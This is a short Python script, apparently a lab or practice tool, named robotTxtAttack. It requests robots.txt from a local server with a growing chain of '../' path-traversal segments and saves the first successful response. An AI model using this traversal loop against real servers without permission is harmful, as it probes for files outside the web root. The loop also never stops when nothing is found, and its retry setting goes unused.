import aiohttp
import asyncio
from aiohttp import ClientTimeout

SERVER_ENDPOINT = "http://localhost:8080/"
SEARCHED_FILE = "robots.txt"
RETRY_COUNT = 3
RETRY_DELAY = 3  # seconds

async def robotTxtAttack():
    async with aiohttp.ClientSession() as session:
        found = False
        traversal_path = ""
        while not found:
            url = SERVER_ENDPOINT + traversal_path + SEARCHED_FILE
            try:
                async with session.get(url, timeout=ClientTimeout(total=10)) as response:
                    content = await response.text()
                    if response.status == 200:
                        print(f"Found {SEARCHED_FILE} at {url}")
                        with open("success.html", "w") as f:
                            f.write(content)
                        found = True
                    else:
                        print(f"Attempt failed for URL: {url}")
            except Exception as e:
                print(f"Error for URL {url}: {e}")
            traversal_path += "../"
            await asyncio.sleep(RETRY_DELAY)

async def main():
    await robotTxtAttack()

if __name__ == "__main__":
    asyncio.run(main())